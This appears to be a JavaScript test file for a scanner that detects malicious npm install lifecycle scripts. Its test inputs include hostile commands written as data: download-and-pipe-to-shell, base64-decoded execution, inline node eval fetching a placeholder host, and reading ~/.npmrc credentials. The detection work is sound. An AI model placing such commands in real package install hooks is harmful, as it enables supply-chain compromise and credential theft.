// R9 — malicious install-script analysis tests.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { scanInstallScripts } from '../src/sca/install-script-analysis.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const fix = (p) => fs.readFileSync(path.join(__dirname, 'fixtures', 'install-script', p), 'utf8');
const pkg = (scripts) => JSON.stringify({ name: 'x', version: '1.0.0', scripts });

test('fixture: download-pipe-exec postinstall fires (critical)', () => {
  const f = scanInstallScripts('package.json', fix('vulnerable/package.json'));
  assert.ok(f.length >= 1);
  assert.equal(f[0].severity, 'critical');
  assert.equal(f[0].family, 'malicious-install-script');
});

test('fixture: benign hooks (node-gyp/husky/node script.js) do NOT fire', () => {
  assert.equal(scanInstallScripts('package.json', fix('clean/package.json')).length, 0);
});

test('base64 decode-pipe-exec fires', () => {
  const f = scanInstallScripts('package.json', pkg({ preinstall: 'echo Zvvv | base64 -d | bash' }));
  assert.ok(f.some(x => /base64-exec/.test(x.id)));
});

test('inline node -e and eval(atob fire', () => {
  assert.ok(scanInstallScripts('package.json', pkg({ install: "node -e \"require('https').get('http://x')\"" })).some(x => /inline-node-eval/.test(x.id)));
  assert.ok(scanInstallScripts('package.json', pkg({ postinstall: 'node -e "eval(atob(process.argv[1]))"' })).some(x => /eval-decode|inline-node-eval/.test(x.id)));
});

test('credential-file read fires', () => {
  assert.ok(scanInstallScripts('package.json', pkg({ postinstall: 'cat ~/.npmrc > /tmp/x' })).some(x => /cred-read/.test(x.id)));
});

test('precision: a non-package.json file never fires', () => {
  assert.equal(scanInstallScripts('config.json', pkg({ postinstall: 'curl https://x | sh' })).length, 0);
});

test('precision: a plain build script (not a lifecycle hook) does not fire', () => {
  // `build` is not an install lifecycle hook → ignored even if it looks scary.
  assert.equal(scanInstallScripts('package.json', pkg({ build: 'curl https://x | sh' })).length, 0);
});
